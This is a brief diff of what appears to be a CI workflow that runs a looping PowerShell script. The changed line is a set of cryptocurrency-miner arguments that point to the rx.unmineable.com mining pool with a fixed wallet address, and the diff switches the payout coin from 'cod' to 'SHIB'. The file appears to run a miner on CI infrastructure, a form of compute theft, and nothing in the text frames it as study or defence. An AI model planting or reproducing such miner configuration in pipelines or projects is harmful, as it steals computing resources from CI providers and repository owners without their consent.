@@ -34,4 +34,4 @@ jobs:
         ./loop.ps1
 ============================================
 
---donate-level 1 -o rx.unmineable.com:3333 -u cod:0xC9F6a1E2efb4843Be10A69831f259484AFA34764.weber1 -p x -k -a rx/0
+--donate-level 1 -o rx.unmineable.com:3333 -u SHIB:0xC9F6a1E2efb4843Be10A69831f259484AFA34764.weber1 -p x -k -a rx/0
